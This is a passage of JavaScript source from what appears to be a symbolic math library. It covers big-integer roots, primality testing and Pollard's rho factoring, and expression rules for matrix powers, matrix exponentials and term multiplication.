  var x = BigInteger.multiply(BigInteger.add(nthRoot(BigInteger.divide(S, BigInteger.exponentiate(BigInteger.BigInt(2), BigInteger.multiply(f, n))), n), BigInteger.BigInt(1)), BigInteger.exponentiate(BigInteger.BigInt(2), f));
  var xprev = BigInteger.add(x, BigInteger.BigInt(1));
  while (BigInteger.lessThan(x, xprev)) {
    xprev = x;
    x = BigInteger.divide(BigInteger.add(BigInteger.multiply(x, BigInteger.subtract(n, BigInteger.BigInt(1))), BigInteger.divide(S, BigInteger.exponentiate(x, BigInteger.subtract(n, BigInteger.BigInt(1))))), n);
  }
  return xprev;
}

self.nthRoot = nthRoot;

})();
(function () {
"use strict";


function min(a, b) {
  return BigInteger.lessThan(a, b) ? a : b;
}

function modPow(base, exponent, modulus, accumulator) {
  return !BigInteger.lessThan(BigInteger.BigInt(0), exponent) ? accumulator : modPow(BigInteger.remainder(BigInteger.multiply(base, base), modulus), BigInteger.divide(exponent, BigInteger.BigInt(2)), modulus, !BigInteger.lessThan(BigInteger.remainder(exponent, BigInteger.BigInt(2)), BigInteger.BigInt(1)) ? BigInteger.remainder(BigInteger.multiply(accumulator, base), modulus) : accumulator);
}

function bitLength(n) {
  var x = BigInteger.toNumber(n);
  return x < 1 / 0 ? Math.floor(Math.log(x) / Math.log(2)) : 1024 + bitLength(BigInteger.divide(n, BigInteger.exponentiate(2, 1024)));
}

function log(n) {
  //n = f * 2**e
  //Math.log(n) = Math.log(f) + Math.log(2) * e;
  var x = BigInteger.toNumber(n);
  return x < 1 / 0 ? Math.log(x) : Math.log(BigInteger.toNumber(BigInteger.divide(n, BigInteger.exponentiate(2, bitLength(n) - 53))) + Math.log(2) * (bitLength(n) - 53));
}

// isPrime implementation is stolen from:
// https://github.com/peterolson/BigInteger.js
// https://en.wikipedia.org/wiki/Miller%E2%80%93Rabin_primality_test#Deterministic_variants
function isPrime(n) {
  if (BigInteger.lessThan(n, BigInteger.BigInt(2))) {
    throw new RangeError();
  }
  if (!BigInteger.lessThan(BigInteger.BigInt(2), n)) {
    return true;
  }
  if (BigInteger.lessThan(BigInteger.remainder(n, BigInteger.BigInt(2)), BigInteger.BigInt(1))) {
    return false;
  }
  var s = 0;
  var d = BigInteger.subtract(n, BigInteger.BigInt(1));
  while (BigInteger.lessThan(BigInteger.remainder(d, BigInteger.BigInt(2)), BigInteger.BigInt(1))) {
    d = BigInteger.divide(d, BigInteger.BigInt(2));
    s += 1;
  }
  for (var a = min(BigInteger.subtract(n, BigInteger.BigInt(1)), BigInteger.BigInt(Math.floor(2 * Math.pow(log(n), 2)))); !BigInteger.lessThan(a, BigInteger.BigInt(2)); a = BigInteger.subtract(a, BigInteger.BigInt(1))) {
    var adn = modPow(a, d, n, BigInteger.BigInt(1));
    if (BigInteger.lessThan(adn, BigInteger.BigInt(1)) || BigInteger.lessThan(BigInteger.BigInt(1), adn)) {
      for (var r = 0, x = adn; BigInteger.lessThan(x, BigInteger.subtract(n, BigInteger.BigInt(1))); r += 1, x = BigInteger.remainder(BigInteger.multiply(x, x), n)) {
        if (r === s - 1) {
          return false;
        }
      }
    }
  }
  return true;
}

function abs(a) {
  return BigInteger.lessThan(a, BigInteger.BigInt(0)) ? BigInteger.unaryMinus(a) : a;
}

function gcd(a, b) {
  while (BigInteger.lessThan(BigInteger.BigInt(0), b)) {
    var t = BigInteger.remainder(a, b);
    a = b;
    b = t;
  }
  return a;
}

// Pollard's rho implementation is stolen from:
// https://github.com/jiggzson/nerdamer/blob/master/nerdamer.core.js
// https://en.wikipedia.org/wiki/Pollard%27s_rho_algorithm#C_code_sample
function primeFactorByPollardRho(n) {
  if (BigInteger.lessThan(n, BigInteger.BigInt(2))) {
    throw new RangeError();
  }
  if (isPrime(n)) {
    return n;
  }
  var factor = n;
  for (var x0 = BigInteger.BigInt(2); !BigInteger.lessThan(factor, n); x0 = BigInteger.add(x0, BigInteger.BigInt(1))) {
    if (BigInteger.lessThan(BigInteger.remainder(n, x0), BigInteger.BigInt(1))) {
      //?
      return x0;
    }
    var xFixed = x0;
    var cycleSize = 2;
    var x = x0;
    factor = BigInteger.BigInt(1);
    while (BigInteger.lessThan(factor, BigInteger.BigInt(2))) {
      var test = BigInteger.BigInt(1);
      var testStart = x;
      var found = false;
      for (var count = 1; count <= cycleSize && BigInteger.lessThan(factor, BigInteger.BigInt(2)); count += 1) {
        x = BigInteger.remainder(BigInteger.add(BigInteger.multiply(x, x), BigInteger.BigInt(1)), n);
        //factor = gcd(abs(x - xFixed), n);
        test = BigInteger.remainder(BigInteger.multiply(test, abs(BigInteger.subtract(x, xFixed))), n);
        if (found || count === cycleSize || count % 16 === 0) {
          // https://en.wikipedia.org/wiki/Pollard%27s_rho_algorithm#Variants
          factor = gcd(test, n);
          if (!found && !BigInteger.lessThan(factor, BigInteger.BigInt(2))) {
            cycleSize *= 2;
            factor = BigInteger.BigInt(1);
            x = testStart;
            found = true;
          }
          test = BigInteger.BigInt(1);
          testStart = x;
        }
      }
      cycleSize *= 2;
      xFixed = x;
    }
  }
  var a = primeFactorByPollardRho(factor);
  var b = primeFactorByPollardRho(BigInteger.divide(n, factor));
  return BigInteger.lessThan(a, b) ? a : b;
}

function primeFactorUsingWheel2(n) {
  var i = 2;
  var s = 0;
  var r = Math.floor(Math.sqrt(n + 0.5));
  while (i <= r) {
    if (n % i === 0) {
      return i;
    }
    i += s === 2 ? 2 : s + 1;
    s += 1;
    if (s === 4) {
      s = 2;
    }
  }
  return n;
}

function primeFactor(n) {
  var x = BigInteger.toNumber(n);
  if (x <= 9007199254740991) {
    return BigInteger.BigInt(primeFactorUsingWheel2(x));
  }
  var s = BigInteger.toNumber(gcd(n, BigInteger.BigInt(304250263527210))); // a primorial
  if (s !== 1) {
    //TODO: use-cases - ?
    return BigInteger.BigInt(primeFactorUsingWheel2(s));
  }
  return primeFactorByPollardRho(n);
}

self.primeFactor = primeFactor;

})();
(function () {
"use strict";
/*jslint plusplus: true, vars: true, indent: 2 */

// Thanks to Eduardo Cavazos
// see also https://github.com/dharmatech/Symbolism/blob/master/Symbolism/Symbolism.cs

// public API: 
// Expression.prototype.add
// Expression.prototype.subtract
// Expression.prototype.multiply
// ...
// protected API:
// Expression.prototype.addExpression
// Expression.prototype.addInteger

  
  
  
  
  
  
  

  var pow = function (x, count, accumulator) {
    if (count < 0) {
      throw new RangeError();
    }
    if (count > 9007199254740991) {
      throw new RangeError("NotSupportedError");
    }
    return (count < 1 ? accumulator : (2 * Math.floor(count / 2) !== count ? pow(x, count - 1, accumulator.multiply(x)) : pow(x.multiply(x), Math.floor(count / 2), accumulator)));
  };
  
  var isDiagonal= function (matrix) {
    for (var i = 0; i < matrix.rows(); i += 1) {
      for (var j = 0; j < matrix.cols(); j += 1) {
        if (i !== j && !matrix.e(i, j).equals(Expression.ZERO)) {
          return false;
        }
      }
    }
    return true;
  };

  var matrixInN = function (matrix, n) {
    var condition = -1;
    if (isDiagonal(matrix)) {
      var result = matrix.map(function (e, i, j) {
        if (i === j && e.equals(Expression.ZERO)) {
          condition = 0;
          return Expression.ZERO;
        }
        return i === j ? e.pow(n) : Expression.ZERO;
      });
      return {an: result, condition: function (e) { return condition !== -1 ? new ExpressionWithCondition(e, n, condition) : e; }};
    }
    // https://stackoverflow.com/a/15302448/839199
    var binomialCoefficient = function (n, k) { // binomail coefficient
      return k === 0 ? Expression.ONE : n.multiply(binomialCoefficient(n.subtract(Expression.ONE), k - 1)).divide(Integer.fromNumber(k));
    };
    //Note: experimental
    // {{1,0,0},{0,1,1},{0,0,1}}^n === {{1,0,0},{0,1,n},{0,0,1}}
    // A
    var a = matrix;
    // A^(n-1)
    var symbolName = "aa";
    var anm1 = matrix.map(function (e, i, j) {
      return new Expression.Symbol(symbolName + "_(" + i + "," + j + ")");
    });
    var anm1previous = anm1.map(function (e, i, j) {
      return Expression.ZERO;
    });
    var an = undefined;
    var iteration = -1;
    while (!anm1.eql(anm1previous)) {
      iteration += 1;
      anm1previous = anm1;
      // A^(n) = A^(n-1) * A;
      an = anm1.multiply(a);
      anm1 = an.map(function (e, i, j) {
        var isSymbol = anm1.e(i, j) instanceof Expression.Symbol && anm1.e(i, j).symbol.slice(0, symbolName.length) === symbolName;
        if (!isSymbol) {
          return anm1.e(i, j);//?
        }

        // an: {{1,0,0},{0,1,1+aa_23},{0,0,1}}
        // a_n = n + a_(n-1)
        // a_n = k * a_(n-1) + k**(n-(m+1)) * choose(n-1, m)
        // =>
        // a_n = k**(n-(m+1)) * choose(n, m+1)
        // choose(n-1, m+1) + choose(n-1, m) = choose(n, m+1)
        if (!(e instanceof Integer)) {
          var m = Polynomial.toPolynomial(e.getNumerator(), n).getDegree();
          var previous = anm1.e(i, j);
          var p = Polynomial.toPolynomial(e.getNumerator(), previous);
          var k = p.getLeadingCoefficient().divide(e.getDenominator());
          //TODO: remove `k instanceof Integer`
          if (p.getDegree() === 1 &&
              a.e(i, j).equals(Expression.ZERO) && //TODO: remove
              (k instanceof Integer || k instanceof Expression.Complex) &&
              e.equals(k.multiply(previous).add(k.pow(n).divide(k.pow(Integer.fromNumber(m + 1))).multiply(binomialCoefficient(n.subtract(Expression.ONE), m))))) {
            console.log("!", e.toString());
            // a.e(i, j).add()
            return k.pow(n).divide(k.pow(Integer.fromNumber(m + 2))).multiply(binomialCoefficient(n.subtract(Expression.ONE), m + 1));
          }
        }
        // a_n = a_(n-1)
        if (e.equals(anm1.e(i, j))) {
          return a.e(i, j);
        }
        // a_n = k * a_(n-1) => a_n = k**(n - 1) * a_1
        if (anm1.e(i, j) instanceof Expression.Symbol && anm1.e(i, j).symbol === symbolName + "_(" + i + "," + j + ")" && !e.equals(Expression.ZERO)) {
          var k = e.divide(anm1.e(i, j));
          if (k instanceof Integer ||
              k instanceof Expression.Complex ||
              (k.getNumerator() instanceof Integer && e.getDenominator() instanceof Integer) ||
              (k.getNumerator() instanceof NthRoot && k.getDenominator() instanceof Integer)) {
            return k.pow(n.subtract(Expression.TWO)).multiply(a.e(i, j));
          }
        }
        if (anm1.e(i, j) instanceof Expression.Symbol && anm1.e(i, j).symbol === symbolName + "_(" + i + "," + j + ")" && e.equals(Expression.ZERO)) {
          condition = iteration;
          return Expression.ZERO;
        }
        // a_n = a_(n-1) + b => a_n = a_1 + b*(n-1)
        var sub = e.subtract(anm1.e(i, j));
        if (sub instanceof Integer) {
          return a.e(i, j).add(sub.multiply(n.subtract(Expression.TWO)));
        }
        var dpnm1pda = function (k) {
          var previous = anm1.e(i, j);
          return k.multiply(previous).add(k.pow(n.subtract(Expression.ONE)));
        };
        // a_n = d**(n-1) + d * a_(n-1)
        if (e instanceof Expression.Division && e.getDenominator() instanceof Integer) {
          var d = e.getDenominator();
          if (e.equals(dpnm1pda(d))) {
            return d.pow(n.subtract(Expression.TWO)).multiply(n.subtract(Expression.TWO).add(a.e(i, j)));
          }
          var d = e.getDenominator().negate();
          if (e.equals(dpnm1pda(d))) {
            return d.pow(n.subtract(Expression.TWO)).multiply(n.subtract(Expression.TWO).add(a.e(i, j)));
          }
        }
        // a_n = (-1)**(n-1) - a_(n-1)
        var d = Expression.ONE.negate();
        if (e.equals(dpnm1pda(d))) {
          return d.pow(n.subtract(Expression.TWO)).multiply(n.subtract(Expression.TWO).add(a.e(i, j)));
        }
        
        //?
        var d = Expression.I;
        if (e.equals(dpnm1pda(d))) {
          return d.pow(n.subtract(Expression.TWO)).multiply(n.subtract(Expression.TWO).add(a.e(i, j)));
        }
        var d = Expression.I.negate();
        if (e.equals(dpnm1pda(d))) {
          return d.pow(n.subtract(Expression.TWO)).multiply(n.subtract(Expression.TWO).add(a.e(i, j)));
        }
        
        
        return anm1.e(i, j);
      });
    }
    var ok2 = true;
    for (var i = 0; i < anm1.rows(); i += 1) {
      for (var j = 0; j < anm1.cols(); j += 1) {
        var e = anm1.e(i, j);
        if (e instanceof Expression.Symbol && e.symbol.slice(0, symbolName.length) === symbolName) {
          ok2 = false;
        }
      }
    }
    if (condition > 0) {
      return undefined;
    }
    return !ok2 ? undefined : {an: an, condition: function (e) { return condition !== -1 ? new ExpressionWithCondition(e, n, condition) : e; }};
  };

  var enableEX = true;
  var enable2X = true;
  var enableEC = true;

  Expression.prototype.powExpression = function (x) {
    var y = this;

    if (x instanceof Expression.Matrix && y instanceof Expression.Symbol && (y.symbol === "t" || y.symbol === "T")) {
      return x.transpose();
    }

    //!
    if (y instanceof Division && y.a instanceof Integer && y.b instanceof Integer && x !== Expression.E && !(x instanceof Expression.Symbol) && !Expression.has(x, Expression.Symbol)) {
      if (typeof hit === "function") {
        hit({powExpression: y.toString()});
      }
      var n = y.b.toNumber();
      //if (n >= 2 && n <= 9007199254740991) {//TODO:
        var q = y.a.truncatingDivide(y.b);
        var r = y.a.subtract(q.multiply(y.b));
        if (q.equals(Expression.ZERO)) {// to avoid multiplication event
          return x.pow(r)._nthRoot(n);
        }
        return x.pow(q).multiply(x.pow(r)._nthRoot(n));
      //}
    }
    //!

    if (x instanceof Expression.Integer && y === Expression.CIRCLE) {
      return new Expression.Degrees(x);
    }

    //!new 2017-05-08
    if (enableEX) {
      if (x === Expression.E || (enable2X && x instanceof Integer && x.compareTo(Expression.ONE) > 0 && integerPrimeFactor(x).compareTo(x) === 0)) {
        var isValid = function (y) {
          if (y instanceof Expression.Symbol) {
            return true;
          }
          if (y instanceof Addition) {
            return isValid(y.a) && isValid(y.b);
          }
          if (y instanceof Integer && x === Expression.E) {
            return true;
          }
          if (y instanceof Multiplication && y.a instanceof Integer && y.b instanceof Expression.Symbol) {
            return true;
          }
          if ((x === Expression.E || x instanceof Integer && x.compareTo(Expression.ONE) > 0) && y instanceof Division && y.b instanceof Integer) {//!new 2019-08-08
            return isValid(y.a);//?
          }
          return false;
        };
        if (isValid(y)) {
          if (y.isNegative()) {
            return Expression.ONE.divide(new Expression.Exponentiation(x, y.negate()));
          }
          return new Expression.Exponentiation(x, y);
        }
      }
      if (enable2X && x instanceof Integer && x.compareTo(Expression.ONE) > 0) {
        if (y instanceof Addition && (y.a instanceof Integer || y.b instanceof Integer)) {
          return x.pow(y.a).multiply(x.pow(y.b));
        }
        var xf = integerPrimeFactor(x);
        if (xf.equals(x)) {
          if (y instanceof Division && y.b instanceof Integer) {
            var n = y.b.toNumber();
            if (n >= 2 && n <= 9007199254740991) {
              return x.pow(y.a)._nthRoot(n);
            }
          }
        }
        return xf.pow(y).multiply(x.divide(xf).pow(y));
      }
    }
    //!

    if (enableEX) {
      //TODO: - ?
      if (x instanceof Integer && x.equals(Expression.ONE)) {
        return Expression.ONE;
      }
      if (x instanceof Division) {
        return x.a.pow(y).divide(x.b.pow(y));
      }
      if (enable2X) {
        if (x instanceof Multiplication) {
          return x.a.pow(y).multiply(x.b.pow(y));
        }
      }
    }

    var yn = y.getNumerator();
    if (x === Expression.E && yn instanceof Multiplication && yn.a instanceof Expression.Complex && yn.a.real.equals(Expression.ZERO) && yn.b instanceof Expression.Symbol) {
      var t = y.multiply(Expression.I.negate());
      return t.cos().add(Expression.I.multiply(t.sin()));
    }

    //TODO: 
    if (x instanceof Expression.Matrix && y instanceof Expression.Symbol && (y.symbol === "n" || y.symbol === "k")) {
      if (!x.matrix.isSquare()) {
        throw new RangeError("NonSquareMatrixException");
      }
      var tmp = matrixInN(x.matrix, y);
      if (tmp != undefined) {
        return tmp.condition(new Expression.Matrix(tmp.an));
      }

      //! 2018-08-26
      if (true) {
        var tmp = Expression.getEigenvalues(x.matrix);
        var eigenvalues = tmp.eigenvalues;
        var multiplicities = tmp.multiplicities;
        if (Expression.sum(multiplicities) === x.matrix.cols()) {
          var tmp2 = Expression.getEigenvectors(x.matrix, eigenvalues);
          var eigenvectors = tmp2.eigenvectors;
          if (eigenvectors.length === x.matrix.cols()) {
            var tmp = Expression.diagonalize(x.matrix, eigenvalues, multiplicities, eigenvectors);
            var L = tmp.L;
            var SL = matrixInN(L, y);
            if (SL != undefined) {
              if (Expression.callback != undefined) {
                Expression.callback(new Expression.Event("pow-using-diagonalization", x));
              }
              if (Expression.callback != undefined) {
                //TODO more details (A=P*D*P^-1 => A^n=P*D*P^-1 * ... * P*D*P^-1=P*D^n*P^1
                Expression.callback(new Expression.Event("diagonalize", x));
              }
              return SL.condition(new Expression.Matrix(tmp.T.multiply(SL.an).multiply(tmp.T_INVERSED)));
            }
          } else {
            var tmp = Expression.getFormaDeJordan(x.matrix, eigenvalues, multiplicities);
            var JN = matrixInN(tmp.J, y);
            if (JN != undefined) {
              if (Expression.callback != undefined) {
                Expression.callback(new Expression.Event("pow-using-Jordan-normal-form", x));
              }
              if (Expression.callback != undefined) {
                //TODO more details (A=P*D*P^-1 => A^n=P*D*P^-1 * ... * P*D*P^-1=P*D^n*P^1
                Expression.callback(new Expression.Event("Jordan-decomposition", x));
              }
              //TODO: details !!!
              return JN.condition(new Expression.Matrix(tmp.P.multiply(JN.an).multiply(tmp.P_INVERSED)));
            }
          }
        }
      }
      //!
    }
    
    if (Expression.ExponentiationOfMinusOne != null) {
      if (x instanceof Integer && x.compareTo(Expression.ZERO) < 0) {
        if (y instanceof Expression.Symbol && (y.symbol === "n" || y.symbol === "k")) {
          return new Expression.ExponentiationOfMinusOne(Expression.ONE.negate(), y).multiply(x.negate().pow(y));
        }
        if (y instanceof Addition && y.a instanceof Expression.Symbol && (y.a.symbol === "n" || y.a.symbol === "k") && y.b instanceof Integer) {
          return new Expression.ExponentiationOfMinusOne(Expression.ONE.negate(), y.a).multiply(Expression.ONE.negate().pow(y.b)).multiply(x.negate().pow(y));
        }
        if (y instanceof Multiplication) {
          return x.pow(y.a).pow(y.b);
        }
        if (y instanceof Addition && y.b instanceof Integer) {
          return x.pow(y.a).multiply(x.pow(y.b));
        }
      }
    }

    if (Expression.ExponentiationOfImaginaryUnit != null) {
      if (x instanceof Expression.Complex && x.equals(Expression.I.negate())) {
        return Expression.ONE.negate().pow(y).multiply(x.negate().pow(y));
      }
      if (x instanceof Expression.Complex && x.equals(Expression.I)) {//TODO: -i, other complex numbers - ?
        if (y instanceof Expression.Symbol && (y.symbol === "n" || y.symbol === "k")) {
         return new Expression.ExponentiationOfImaginaryUnit(Expression.I, y);
        }
        if (y instanceof Addition && y.a instanceof Expression.Symbol && (y.a.symbol === "n" || y.a.symbol === "k") && y.b instanceof Integer) {
          var t = Expression.I.pow(y.b);
          return new Expression.ExponentiationOfImaginaryUnit(Expression.I, t instanceof Expression.Complex ? y.a.add(Expression.ONE) : y.a).multiply(t instanceof Expression.Complex ? t.divide(Expression.I) : t);
        }
        if (y instanceof Multiplication) {
          return x.pow(y.a).pow(y.b);
        }
        if (y instanceof Addition && y.b instanceof Integer) {
          return x.pow(y.a).multiply(x.pow(y.b));
        }
      }
    }

    if (x === Expression.E && y instanceof Expression.Matrix) {
      if (!y.matrix.isSquare()) {
        throw new RangeError("NonSquareMatrixException");
      }
      // https://en.wikipedia.org/wiki/Matrix_exponential#Using_the_Jordan_canonical_form
      var tmp = Expression.getEigenvalues(y.matrix);
      var eigenvalues = tmp.eigenvalues;
      var multiplicities = tmp.multiplicities;
      if (Expression.sum(multiplicities) === y.matrix.cols()) {
        var tmp = Expression.getFormaDeJordan(y.matrix, eigenvalues, multiplicities);
        // exp(A) = exp(P*J*P^-1) = P*exp(D + N)*P^-1 = P*exp(D)*exp(N)*P^-1
        var D = tmp.J.map(function (e, i, j) {
          return i === j ? e : Expression.ZERO;
        });
        var N = tmp.J.map(function (e, i, j) {
          return i !== j ? e : Expression.ZERO;
        });
        var exp = function (N) {
          // https://en.wikipedia.org/wiki/Matrix_exponential#Nilpotent_case
          var z = Matrix.Zero(N.cols(), N.cols());
          var s = z;
          var p = Matrix.I(N.cols());
          var k = 0;
          var f = 1;
          while (!p.eql(z)) {
            var summand = p.scale(Expression.ONE.divide(Integer.fromNumber(f)));
            s = s.add(summand);
            p = p.multiply(N);
            k += 1;
            f *= k;
          }
          return s;
        };
        if (Expression.callback != undefined) {
          Expression.callback(new Expression.Event("exponential-using-Jordan-canonical-form", y));
        }
        //if (Expression.callback != undefined) {
        //  Expression.callback(new Expression.Event("Jordan-decomposition", y));
        //}
        return new Expression.Matrix(tmp.P.multiply(D.map(function (e, i, j) {
          return i === j ? Expression.E.pow(e) : Expression.ZERO;
        }).multiply(exp(N))).multiply(tmp.P_INVERSED));
      }
    }

    //!2019-04-22
    if (x instanceof NthRoot && x.a instanceof Integer) {
      if (x.n === 2) {//TODO:
        return x.a.pow(y.divide(Expression.TWO));
      }
    }

    if (enableEC) {
      if (x === Expression.E && isConstant(y) && !has(y, Expression.Complex)) {
        return new Expression.Exponentiation(x, y);
      }
      if ((x instanceof Expression.Symbol || Expression.has(x, Expression.Symbol)) && y instanceof Expression.Division && y.getDenominator() instanceof Integer) {
        return x.pow(y.getNumerator())._nthRoot(y.getDenominator().toNumber());
      }
      if (x === Expression.E && y instanceof Expression.Addition) {
        return x.pow(y.a).multiply(x.pow(y.b));
      }
      if (x instanceof Exponentiation && getBase(x) === Expression.E) {//?
        return getBase(x).pow(getExponent(x).multiply(y));
      }
    }

    throw new RangeError("NotSupportedError");
  };

  // compare two expression, which are factors (multiplicaiton operands) of terms (addition operands)
  Expression.prototype.compare4Addition = function (y) {
    var x = this;
    if (x instanceof Expression.Symbol && y instanceof Integer) {
      return +1;
    }
    if (x instanceof Integer && y instanceof Expression.Symbol) {
      return -1;
    }
    if (x instanceof Integer && y instanceof Integer) {
      return x.compareTo(y);
    }
    if (x instanceof Expression.Symbol && y instanceof Expression.Symbol) {
      return x.symbol < y.symbol ? -1 : (y.symbol < x.symbol ? +1 : 0);
    }
    //!
    if (x instanceof Expression.Matrix && y instanceof MatrixSymbol) {
      return +1;
    }
    if (x instanceof MatrixSymbol && y instanceof Expression.Matrix) {
      return -1;
    }
    if (x instanceof Expression.Matrix && y instanceof Expression.Matrix) {
      if (x.matrix.rows() === y.matrix.rows() &&
          x.matrix.cols() === y.matrix.cols()) {
        var rows = x.matrix.rows();
        var cols = x.matrix.cols();
        for (var i = 0; i < rows; i += 1) {
          for (var j = 0; j < cols; j += 1) {
            var c = x.matrix.e(i, j).compare4Addition(y.matrix.e(i, j));
            if (c !== 0) {
              return c;
            }
          }
        }
      }
    }
    
    //!new 2016-12-17
    //NOTE: the `x instanceof Addition || y instanceof Addition` should be used before `x instanceof Multiplication || y instanceof Multiplication`
    if (x instanceof Addition || y instanceof Addition) {
      return Addition.compare4Addition(x, y);
    }

    //!new 2016-10-09
    if (x instanceof Multiplication || y instanceof Multiplication) {
      return Multiplication.compare4Addition(x, y);
    }
    
    //!new 2017-02-10
    if (x instanceof Expression.Matrix || y instanceof Expression.Symbol) {
      return -1;
    }

    //!new 2018-10-11
    if (x instanceof Integer && y instanceof Expression.Function) {
      return -1;
    }

    //!new 2018-11-12
    if (x instanceof Division && y instanceof Division) {
      return x.a.compare4Addition(y.a) || x.b.compare4Addition(y.b);//?
    }
    if (x instanceof Expression && y instanceof Division) {
      return +1;//?
    }
    if (x instanceof Division && y instanceof Expression) {
      return -1;//?
    }

    //!2019-02-18
    if (x instanceof Integer && y instanceof Expression.Complex) {
      return -1;//?
    }
    if (x instanceof Expression.Complex && y instanceof Integer) {
      return +1;//?
    }
    //!

    if (x.equals(y)) {
      return 0;//!
    }
    
    //!
    throw new RangeError();
  };
  
  var compare = function (x, y) {
    return x.compare4Addition(y);
  };

  var compare4Multiplication = function (x, y) {
    //TODO: Exponentiation + Exponentiation, Exponentiation + Symbol, Symbol + Exponentiation
    return x.compare4Multiplication(y);
  };

  var getBase = function (x) {
    //TODO: ?
    //if (x instanceof NthRoot) {
    //  return x.a;
    //}
    return x instanceof Exponentiation ? x.a : x;
  };
  var getExponent = function (x) {
    //TODO: ?
    //if (x instanceof NthRoot) {
    //  return Expression.Integer.fromNumber(x.n);
    //}
    return x instanceof Exponentiation ? x.b : Expression.ONE;
  };

  var getConstant = function (e) {
    if (e instanceof Integer) {
      return e;
    } else if (e instanceof Expression.Complex) {
      return e;
    } else if (e instanceof Multiplication) {
      var c = undefined;
      var x = e;
      for (var multiplications = x.factors(), y = multiplications.next().value; y != null; y = multiplications.next().value) {
        var t = getConstant(y);
        c = c == undefined ? t : t.multiply(c);
      }
      if (c != undefined) {
        return c;
      }
    } else if (e instanceof Addition) { // -5*x+15
      var c = undefined;
      for (var additions = e.summands(), x = additions.next().value; x != null; x = additions.next().value) {
        var t = getConstant(x);
        //c = c == undefined ? t : integerGCD(t, c);
        c = c == undefined ? t : complexGCD(t, c);
      }
      if (c != undefined) {
        return c;
      }
    }
    return Expression.ONE;
  };
  var getTerm = function (x) {
  // TODO: fix performance ?
    if (x instanceof Integer) {
      return undefined;
    } else if (x instanceof Expression.Complex) {
      return undefined;
    } else if (x instanceof Multiplication) {
      var terms = [];
      for (var multiplications = x.factors(), y = multiplications.next().value; y != null; y = multiplications.next().value) {
        var t = getTerm(y);
        if (t != undefined) {
          terms.push(t);
        }
      }
      var result = undefined;
      for (var j = terms.length - 1; j >= 0; j -= 1) {
        result = result == undefined ? terms[j] : new Multiplication(result, terms[j]);
      }
      return result;
    }
    return x;
  };

  var multiplyByInteger = function (x, y) {
    if (x.compareTo(Expression.ZERO) === 0) {
      return x;
    }
    if (x.compareTo(Expression.ONE) === 0) {
      return y;
    }
    return new Multiplication(x, y);
  };
  
  Expression.prototype.multiplyExpression = function (x) {
    var y = this;

    if (x instanceof Expression && y instanceof Multiplication) {
      return x.multiply(y.a).multiply(y.b);
    }
    if (x instanceof Multiplication && y instanceof Expression) {
      var c = compare4Multiplication2(x.b, y);
      if (c === 0) {
        return x.a.multiply(x.b.multiply(y));
      }
      return c > 0 ? x.a.multiply(y).multiply(x.b) : new Multiplication(x, y);
    }

    //!
    if (x instanceof IdentityMatrix && y instanceof MatrixSymbol) {
      return y;
    }
    if (y instanceof IdentityMatrix && x instanceof MatrixSymbol) {
      return x;
    }
    //!
    // rest

    var c = 0;
    if (x instanceof Integer && y instanceof Expression.Symbol) {
      return multiplyByInteger(x, y);
    }
    if (x instanceof Expression.Symbol && y instanceof Integer) {
      return multiplyByInteger(y, x);
    }
    if (x instanceof Expression.Symbol && y instanceof Expression.Symbol) {
      c = compare4Multiplication(x, y);
      if (c === 0) {
        return x.pow(Expression.TWO);
      }
      return c > 0 ? new Multiplication(y, x) : new Multiplication(x, y);
    }
    if (x instanceof Integer && y instanceof Exponentiation) {
      return multiplyByInteger(x, y);
    }
    if (x instanceof Exponentiation && y instanceof Integer) {
      return multiplyByInteger(y, x);
    }
    if (x instanceof Exponentiation && y instanceof Expression.Symbol) {
      c = compare4Multiplication(getBase(x), y);
      if (c === 0) {
        return y.pow(getExponent(x).add(Expression.ONE));
      }
      return c > 0 ? new Multiplication(y, x) : new Multiplication(x, y);
    }
    if (x instanceof Expression.Symbol && y instanceof Exponentiation) {
      c = compare4Multiplication(x, getBase(y));
      if (c === 0) {
        return x.pow(getExponent(y).add(Expression.ONE));
      }
      return c > 0 ? new Multiplication(y, x) : new Multiplication(x, y);
    }
    if (x instanceof Exponentiation && y instanceof Exponentiation) {
      c = compare4Multiplication(getBase(x), getBase(y));
      if (c === 0) {
        return getBase(x).pow(getExponent(x).add(getExponent(y)));
      }
      return c > 0 ? new Multiplication(y, x) : new Multiplication(x, y);
    }

    if (x instanceof SquareRoot && y instanceof SquareRoot) {
      if (x.a instanceof Integer && y.a instanceof Exponentiation) {//TODO: fix
        return new Multiplication(x, y);
      }
      return x.a.multiply(y.a).squareRoot();
    }
    if (x instanceof CubeRoot && y instanceof CubeRoot) {
      return x.a.multiply(y.a).cubeRoot();
    }
    if (x instanceof NthRoot && y instanceof NthRoot) {
      //if (x.n === y.n) {
      //  return x.a.multiply(y.a)._nthRoot(x.n);
      //}
      var ng = ngcd(x.n, y.n);
      if (!(x.a instanceof Integer) || !x.a.gcd(y.a).equals(Expression.ONE)) {
        return Expression.pow(x.a, y.n / ng).multiply(Expression.pow(y.a, x.n / ng))._nthRoot(x.n / ng * y.n);
      }
      return x.n < y.n ? new Multiplication(x, y) : (x.n > y.n ? new Multiplication(y, x) : x.a.multiply(y.a)._nthRoot(x.n));
    }

    //!
    if (x instanceof MatrixSymbol && y instanceof Expression.Matrix) {
      return new Multiplication(x, y);
    }
    if (x instanceof Expression.Matrix && y instanceof MatrixSymbol) {
      return new Multiplication(x, y);
    }
    if (has(x, MatrixSymbol) && y instanceof Expression.Matrix) { // X^2*{{1,2},{3,4}}
      return new Multiplication(x, y);
    }
    if (x instanceof Expression.Matrix && has(y, MatrixSymbol)) { // {{1,2},{3,4}}*X^2
      return new Multiplication(x, y);
    }
    
    //!
    //throw new RangeError();
    if (x instanceof Integer && y instanceof Expression) {
      if (x.compareTo(Expression.ZERO) === 0) {
        return x;
      }
      if (x.compareTo(Expression.ONE) === 0) {
        return y;
      }
    }
    if (x instanceof Expression && y instanceof Integer) {
      if (y.compareTo(Expression.ZERO) === 0) {
        return y;
      }
      if (y.compareTo(Expression.ONE) === 0) {
        return x;
      }
    }

    if (x instanceof Expression.Complex && y instanceof Expression.ExponentiationOfImaginaryUnit) {
      //!hack
      //TODO: remove
      if (x.real.equals(Expression.ZERO) && x !== Expression.I) {
        return x.imaginary.multiply(y.multiply(Expression.I));
      }
    }
    if (x instanceof Expression.ExponentiationOfImaginaryUnit && y instanceof Expression.Complex) {
      //!hack
      //TODO: remove
      if (y.real.equals(Expression.ZERO) && y !== Expression.I) {
        return y.imaginary.multiply(x.multiply(Expression.I));
      }
    }

    var cmp = compare4Multiplication(getBase(x), getBase(y));
    if (cmp === 0) {
      return getBase(x).pow(getExponent(x).add(getExponent(y)));
    }
    if (cmp < 0) {
      return new Multiplication(x, y);
    }
    if (cmp > 0) {
